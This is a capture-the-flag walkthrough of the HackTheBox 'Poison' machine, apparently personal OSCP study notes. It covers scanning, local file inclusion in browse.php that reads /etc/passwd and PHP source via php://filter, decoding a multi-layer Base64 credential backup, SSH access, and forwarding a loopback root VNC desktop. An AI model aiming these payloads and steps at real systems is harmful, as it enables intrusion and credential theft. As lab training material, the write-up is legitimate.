---
tags: [HTB, Poison, FreeBSD, LFI, Credentials, SSH, PortForwarding, VNC, Easy]
platform: HackTheBox
os: FreeBSD
hostname: Poison
domain: None
difficulty: Easy
ip: $BoxIP
status: Complete
---

# HTB: Poison, Full Walkthrough

## The gist

Poison is an Easy FreeBSD box built around a readable PHP file-inclusion parameter and an exposed credential backup:

1. The web application exposes PHP test pages and a `file` parameter in `browse.php`.
2. Local file inclusion reads `/etc/passwd`, PHP source, and the directory listing.
3. `pwdbackup.txt` contains a credential encoded through repeated Base64 layers.
4. The recovered credential provides SSH access as the low-privilege user.
5. Local enumeration shows a loopback-only VNC service owned by root.
6. The VNC password is stored in a protected archive readable from the user home directory.
7. An SSH local forward exposes VNC to Kali, giving access to the root desktop.

The clean chain is:

LFI -> repeated Base64 decoding -> SSH foothold -> loopback VNC discovery -> secret archive -> SSH local forward -> root VNC desktop

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| OS | FreeBSD 11.1 |
| Difficulty | Easy |
| Hostname | Poison |
| IP | $BoxIP |
| Open ports | $SSHPort/tcp, $WebPort/tcp |
| Web stack | Apache 2.4.29, PHP 5.6.32 |
| SSH stack | OpenSSH 7.2 |
| User | $Username |
| Root path | Loopback VNC exposed through SSH port forwarding |

## Variables

~~~bash
boxset BoxName Poison
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/Poison
boxset Domain ''
boxset SSHPort 22
boxset WebPort 80
boxset RemotePort 5901
boxset TunnelPort 5901
boxset Username charix
boxset AdminUser root
~~~

The recovered credential is kept in private loot and referenced through `$Password`. It is intentionally not reproduced here.

> [!tip] ⚡ Efficiency
> Set box-specific values once and reuse them in every command. This reduces copy errors, makes failed steps easier to debug, and lets the same workflow transfer to the next box. Keep credentials and flags in private loot rather than placing them in the walkthrough.

## 1. Start the workspace

The manual session was completed in `$BoxDir`, and the transcript records `boxdone` at close-out. The raw transcript and secret-bearing loot remain outside the vault write-up because they contain credentials and flag values.

The vault-safe evidence summary is [[OSCP/BOXES/BOX LOGS/Poison.evidence.log|Poison evidence log]].

~~~bash
htblog
~~~

## 2. Full TCP scan

~~~bash
sudo nmap -sT --max-retries 1 --max-rtt-timeout 120s $BoxIP -oN $BoxDir/nmap/allports.txt
~~~

Only SSH and HTTP were open.

> [!warning] 💡 Hint
> Do not stop at the default ports. A complete TCP scan proves that the externally reachable attack surface is only SSH and HTTP. If the result is empty or inconsistent, check VPN routing and repeat with a slower scan before changing tools.

> [!tip] ⚡ More efficient path
> Use the full scan to build the port list, then use the targeted service scan below. Version and script detection across every port is slower and produces more noise without improving this decision.

![[poison-1-nmap-allports.png]]
SCREENSHOT: Full TCP scan showing the two externally reachable services.

## 3. Service detection

~~~bash
OpenPorts="$SSHPort,$WebPort"
sudo nmap -sV -sC -p $OpenPorts $BoxIP -oA $BoxDir/nmap/services
~~~

Relevant results:

- `$SSHPort/tcp`: OpenSSH 7.2 on FreeBSD.
- `$WebPort/tcp`: Apache 2.4.29 on FreeBSD with PHP 5.6.32.

![[poison-2-nmap-services.png]]
SCREENSHOT: Service scan identifying OpenSSH, Apache, PHP, and FreeBSD.

The FreeBSD identification matters operationally. Commands such as `netstat -an` are more reliable here than assuming Linux-only tooling is present.

> [!abstract] 🧠 Why
> The operating-system banner changes the local-enumeration playbook. A Linux-first checklist may send you looking for `ss`, `/proc` paths, or systemd artefacts that are absent here. Treat the OS as a tool-selection hint, not just metadata.

> [!tip] 🛠️ Alternative tools
> If the default scan is unavailable, `nmap -sT` uses a full TCP connect scan and does not require raw-packet privileges. For quick manual checks, `nc -nv -z` can test a short list of ports, while `curl -I` confirms that an HTTP service is responding.

## 4. Web enumeration

The homepage directly disclosed PHP test pages and a form submitting a `file` parameter to `browse.php`.

~~~bash
curl -sI "http://$BoxIP/"
curl -s "http://$BoxIP/"
gobuster dir -u "http://$BoxIP/" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,txt,html,bak,old,conf -t 40 \
  -o "$BoxDir/loot/gobuster.txt"
~~~

The useful paths were:

| Path | Significance |
|---|---|
| `/browse.php` | File-selection endpoint accepting `file` |
| `/index.php` | Main page |
| `/info.php` | PHP test page |
| `/ini.php` | PHP configuration test page |
| `/phpinfo.php` | PHP information disclosure |
| `/listfiles.php` | Directory listing |
| `/pwdbackup.txt` | Repeatedly encoded credential backup |

> [!warning] 💡 Hint
> Read the homepage and its source before launching a large wordlist. The application names its PHP test pages and exposes the `file` parameter directly. A directory tool is still useful for confirmation, but the obvious application clues should guide the next request.

> [!tip] ⚡ More efficient path
> Treat a file listing, source comment, or HTML form as a prioritized wordlist. Request every named path, including unusual `.txt` files, before trying multiple scanners. In this box, the application disclosed the credential path more directly than blind fuzzing would.

![[poison-3-web-homepage.png]]
SCREENSHOT: Homepage source disclosing PHP test pages and the `browse.php` file parameter.

## 5. Confirm local file inclusion

The form source showed that `browse.php` included the value of `file`. Absolute paths worked, so begin with a harmless system file and then read PHP source through the filter wrapper.

~~~bash
curl -sG "http://$BoxIP/browse.php" \
  --data-urlencode "file=/etc/passwd"

curl -sG "http://$BoxIP/browse.php" \
  --data-urlencode "file=php://filter/convert.base64-encode/resource=index.php" \
  | base64 -d
~~~

The first request confirmed local file inclusion. The `php://filter` request allowed source review without executing the included PHP file. The application source confirmed the include behavior and the `file` parameter.

> [!abstract] 🧠 Why
> There are two useful questions here: can the parameter read a file, and can it expose the PHP source safely? `/etc/passwd` answers the first. `php://filter` answers the second by returning encoded source instead of asking PHP to execute the included code.

> [!warning] 💡 Hint
> Prefer `--data-urlencode` for the parameter. Wrapper strings contain characters such as `:` and `/`, and manual URL construction is an easy way to test a different value than the one you intended. If relative traversal fails, try an absolute path and then the filter wrapper.

> [!tip] 🛠️ Alternative tools
> Burp Repeater is useful when you want to change only the `file` value and compare responses. `ffuf` can fuzz a parameter or file path when the application does not disclose its own names. If LFI is confirmed but no useful file or credential appears, PHP session or log poisoning is a possible alternate branch, but it was not needed or validated in this run.

## 6. Enumerate application files

~~~bash
curl -s "http://$BoxIP/listfiles.php"
curl -s "http://$BoxIP/pwdbackup.txt" -o "$BoxDir/loot/pwdbackup.txt"
~~~

The directory listing disclosed `pwdbackup.txt`.

![[poison-4-listfiles.png]]
SCREENSHOT: Directory listing exposing `pwdbackup.txt`.

The backup response has a descriptive first line followed by the encoded data. Save the response rather than copying the multi-line value by hand.

> [!warning] 💡 Hint
> A file listing is often more valuable than another round of directory brute force. Once the application gives you a filename, request that exact file and inspect its format before guessing at extensions or locations.

> [!tip] ⚡ Efficiency
> Save multi-line responses to disk and parse them mechanically. Hand-copying a long encoded value introduces whitespace and truncation errors, which can make a valid decoding chain look broken.

## 7. Decode the credential backup mechanically

The manual transcript showed thirteen successful Base64 decoding layers before the final credential material was reached. Decode it into private loot without printing the result.

~~~bash
python3 - "$BoxDir/loot/pwdbackup.txt" "$BoxDir/loot/decoded-credential.txt" <<'PY'
import base64
import sys
from pathlib import Path

src, dst = map(Path, sys.argv[1:])
lines = src.read_bytes().splitlines()
value = b"".join(lines[2:])

decoded_layers = 0
while decoded_layers < 20:
    try:
        value = base64.b64decode(value)
    except Exception:
        break
    decoded_layers += 1

dst.write_bytes(value)
print(f"decoded {decoded_layers} layers; private result saved to {dst}")
PY

boxset Username charix
boxset Password "$(sed -n '1p' "$BoxDir/loot/decoded-credential.txt")"
~~~

Do not place the decoded result in screenshots, notes, commands, or the shared vault.

> [!abstract] 🧠 Why
> Repeated Base64 is obfuscation, not encryption. Each successful decode removes one presentation layer, so a bounded loop is more reliable than guessing how many times to run `base64 -d`. The decoded output is still a credential and should be treated as sensitive even though the transform is reversible.

> [!warning] 💡 Common mistake
> Running `base64 -d` once only removes one layer. Also, decoding the banner or descriptive line along with the data corrupts the input. Keep extraction of the data lines separate from the decode loop and stop when the next decode is no longer valid.

> [!tip] 🛠️ Alternative tools
> CyberChef can perform repeated Base64 decoding interactively and is useful for visual inspection. A shell loop with `base64 -d` works for clean input, but the Python version above is easier to bound, log, and keep out of terminal history.

## 8. SSH foothold

~~~bash
ssh $Username@$BoxIP
~~~

The login banner confirmed FreeBSD 11.1. Once connected, immediately record identity and host details.

~~~bash
id
whoami
hostname
uname -a
~~~

The foothold was the user account stored in the exposed backup.

> [!tip] ⚡ Efficiency
> Run `id`, `whoami`, `hostname`, and `uname -a` immediately after a shell arrives. These four checks establish identity, host, and platform before you choose enumeration commands or attempt a privilege path.

> [!warning] 💡 Hint
> FreeBSD is not just Linux with different paths. Expect different process, networking, package, and service-management commands. When a familiar Linux command is missing, use the platform-native equivalent rather than assuming the finding does not exist.

![[poison-7-ssh-foothold.png]]
SCREENSHOT: Successful SSH login and FreeBSD user shell.

## 9. Enumerate loopback listeners

Use the FreeBSD-native listener check from the SSH shell.

~~~bash
netstat -an
ps aux | grep -i vnc
~~~

The important listeners were:

| Listener | Meaning |
|---|---|
| `127.0.0.1:5801` | VNC-related web/display service bound to loopback |
| `127.0.0.1:5901` | VNC RFB service bound to loopback |

The VNC process referenced root's X desktop and a root-owned VNC password file. The service was not externally visible in the original Nmap scan because it listened only on localhost.

> [!abstract] 🧠 Why
> External Nmap sees the target from the network boundary. A service bound to `127.0.0.1` exists only from the target's own network namespace, so it will not appear until you enumerate from a shell on the box. This is why local enumeration must be repeated after every foothold.

> [!tip] 🛠️ Alternative tools
> `sockstat -4 -l` is the FreeBSD-native alternative to `netstat -an` when it is available. `ps aux` helps connect a listening port to the owning process. On Linux systems, the analogous checks are usually `ss -lntp` or `lsof -i`.

> [!warning] 💡 Hint
> VNC commonly exposes a web viewer on 5801 and the RFB service on 5901. For a native VNC client, the RFB port is the important one. Seeing both ports is a clue that the service is real, not two unrelated web applications.

![[poison-8-netstat.png]]
SCREENSHOT: FreeBSD listener enumeration showing loopback services on the VNC ports.

## 10. Retrieve the VNC password file from the archive

The user home directory contained `secret.zip`, owned by root but readable by the logged-in user. Download it to Kali and inspect the archive without printing the secret.

~~~bash
scp "$Username@$BoxIP:/home/$Username/secret.zip" "$BoxDir/loot/secret.zip"
unzip -l "$BoxDir/loot/secret.zip"
unzip -P "$Password" "$BoxDir/loot/secret.zip" -d "$BoxDir/loot/secret-dir"
chmod 600 "$BoxDir/loot/secret-dir/secret"
~~~

The archive contained the VNC authentication file. Treat it as a credential-bearing artifact and keep it in private loot.

> [!warning] 💡 Hint
> File ownership does not automatically mean a file is unreadable. Check the mode bits and test access as the current user. The useful question is whether the logged-in account can read the archive, not who owns it.

> [!tip] 🛠️ Alternative tools
> Use `unzip -l` or `zipinfo -v` to inspect an archive before extracting it. If the available toolset differs, `7z l` or `bsdtar -tf` may provide the same listing function. Extract only into private loot and restrict permissions on the resulting credential file.

## 11. Forward VNC through SSH

The target-side VNC service was loopback-only, so use an SSH local forward. The first port is Kali's listening port. The second is the target-side loopback port.

~~~bash
ssh -N -L "$TunnelPort:127.0.0.1:$RemotePort" "$Username@$BoxIP" -f
ss -ltnp | grep "$TunnelPort"
~~~

The manual session initially hit a local connection-refused condition while the tunnel was not yet listening. Rechecking with `ss` and starting the forward in the background produced a listener on Kali.

> [!abstract] 🧠 Why
> In `ssh -L local_port:remote_host:remote_port`, the first port is opened on Kali and the second connection is made from the target through the SSH session. `127.0.0.1` therefore refers to the target when it appears after the second colon.

> [!warning] 💡 Common mistake
> Opening `127.0.0.1:5901` in a VNC client without a working tunnel points at Kali itself, not the target. Verify the local listener with `ss -ltnp` before debugging VNC credentials or protocol settings.

> [!tip] 🛠️ Alternative tools
> Keep the SSH forward in the foreground with `ssh -N -L ...` while troubleshooting, then add `-f` once the mapping is confirmed. `ssh -v` shows connection and forwarding errors. Chisel, `socat`, or another tunnel can solve the same class of problem, but SSH is the simplest choice when valid SSH access already exists.

## 12. Connect to the root VNC desktop

~~~bash
vncviewer -passwd "$BoxDir/loot/secret-dir/secret" "127.0.0.1::$TunnelPort"
~~~

The VNC handshake succeeded and identified the desktop as root's X desktop. From the root terminal, prove the context and verify flag presence without recording either value.

~~~bash
id
test -f "/home/$Username/user.txt" && echo user_flag_present
test -f /root/root.txt && echo root_flag_present
pwd
~~~

The root desktop was the privilege boundary. No separate kernel or SUID exploit was needed.

> [!warning] 💡 Hint
> Do not infer privilege from the graphical desktop. Run `id` or `whoami` in the root terminal and verify the expected proof files. A VNC connection can be valid while still landing in the wrong desktop or user session.

> [!tip] ⚡ Efficiency
> Confirm both proof paths with presence checks, record the result privately, and stop. Once the root context is proven, further enumeration only increases noise and cleanup work.

![[poison-10-root-vnc-terminal.png]]
SCREENSHOT: Root terminal in the forwarded VNC desktop with flag presence checks.

## 13. Clean down

No target-side payload files were created or modified. Close the VNC client, terminate the exact SSH forwarding process, and retain the credential-bearing archive only in private loot.

~~~bash
TunnelPID=$(pgrep -f "ssh -N -L $TunnelPort:127.0.0.1:$RemotePort" | head -n1)
test -z "$TunnelPID" || kill "$TunnelPID"
ss -ltnp | grep "$TunnelPort" || true
boxdone
~~~

The manual transcript records `boxdone` after the VNC proof.

> [!warning] 💡 Common mistake
> Avoid a broad `pkill` when a single tunnel is all you need to close. Identify the exact command first, kill that PID, and verify that the local forwarding port is gone. This prevents accidentally terminating an unrelated SSH session.

> [!tip] ⚡ Efficiency
> Because this route created no target-side payload, cleanup is local: close VNC, remove the forwarding process, protect or remove private loot as appropriate, and verify the listener state.

## Decision points and alternate routes

| Observation | Primary route used here | Useful alternative or fallback |
|---|---|---|
| Homepage exposes a `file` parameter | Test `/etc/passwd`, then `php://filter` | Burp Repeater or `ffuf` for parameter and path testing |
| LFI works but no credential file is obvious | Inspect source and application file listings | Test PHP session or log poisoning only when the included file and write primitive are both controllable |
| FreeBSD lacks a familiar Linux command | Use `netstat -an` and `ps aux` | Try `sockstat -4 -l` and other platform-native utilities |
| VNC listens only on target localhost | SSH local forward with `-L` | Chisel or `socat` if SSH forwarding is unavailable |
| Archive tooling behaves differently | List with `unzip -l`, then extract | Try `zipinfo`, `7z`, or `bsdtar` if installed |

The table is a troubleshooting map, not a claim that every branch is required. Follow the smallest branch supported by the evidence you have.

## Credentials

| Account or artifact | Source | Use |
|---|---|---|
| `$Username` | Repeatedly encoded `pwdbackup.txt` | SSH foothold |
| VNC password file | `secret.zip` in the user home directory | Authenticate to root's loopback VNC desktop |
| `$AdminUser` | Root-owned VNC desktop | Root proof |

Secret values are intentionally omitted.

## Key lessons

1. A small custom PHP application can expose its own attack path through test pages and source review.
2. When an include parameter accepts absolute paths, test both system files and `php://filter` source disclosure.
3. Multi-layer encoding should be decoded mechanically and stored privately. Do not hand-copy long credential material.
4. After SSH access, enumerate loopback listeners. Services bound to `127.0.0.1` are invisible to the external port scan.
5. FreeBSD command availability differs from Linux. Keep `netstat -an` in the cross-platform local-enumeration routine.
6. SSH `-L` is enough for one loopback service. It is simpler and safer than exposing the service on a broader interface.

## Checklist

- [x] Full TCP scan
- [x] Service and version scan
- [x] Web content enumeration
- [x] LFI confirmation with `/etc/passwd`
- [x] PHP source disclosure with `php://filter`
- [x] Directory listing and backup discovery
- [x] Mechanical multi-layer Base64 decoding
- [x] SSH foothold
- [x] FreeBSD local listener enumeration
- [x] Loopback VNC discovery
- [x] SSH local port forwarding
- [x] Root desktop proof
- [x] Flag presence confirmed without recording values
- [x] `boxdone` completed

## RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/Start Here|Start Here]]
- [[OSCP/RUNBOOK V2/Port Triage|Port Triage]]
- [[OSCP/RUNBOOK V2/Linux - Service Scan|Linux - Service Scan]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum|Linux - Web Enum]]
- [[OSCP/RUNBOOK V2/Linux - LFI|Linux - LFI]]
- [[OSCP/RUNBOOK V2/Linux - Credential Search|Linux - Credential Search]]
- [[OSCP/RUNBOOK V2/Linux - Local Enum|Linux - Local Enum]]
- [[OSCP/RUNBOOK V2/Linux - Port Forwarding|Linux - Port Forwarding]]
- [[OSCP/RUNBOOK V2/Linux - Clean Down|Linux - Clean Down]]

## Attack Chain

~~~text
TCP 80
  -> browse.php accepts file=
  -> /etc/passwd confirms LFI
  -> php://filter exposes PHP source
  -> listfiles.php discloses pwdbackup.txt
  -> repeated Base64 decoding recovers a private SSH credential
  -> SSH as the low-privilege user
  -> netstat reveals loopback VNC on 5901
  -> secret.zip supplies the VNC authentication file
  -> ssh -L maps target localhost:5901 to Kali localhost:5901
  -> VNC opens root's X desktop
~~~

## Flags

- user.txt: confirmed present in the user home directory; value intentionally omitted.
- root.txt: confirmed present from the root VNC terminal; value intentionally omitted.
- proof.txt: not applicable.

## Lessons Learned

Poison is a reminder that the first scan is only the external view. The web application exposed a file inclusion primitive, but the decisive follow-up was to read its own file listing and handle the backup mechanically. After SSH access, the escalation came from re-enumerating localhost, finding VNC, and forwarding one exact port. The transferable workflow is: confirm the file primitive, inspect source and file lists, protect recovered secrets, then repeat service enumeration from the new trust boundary.
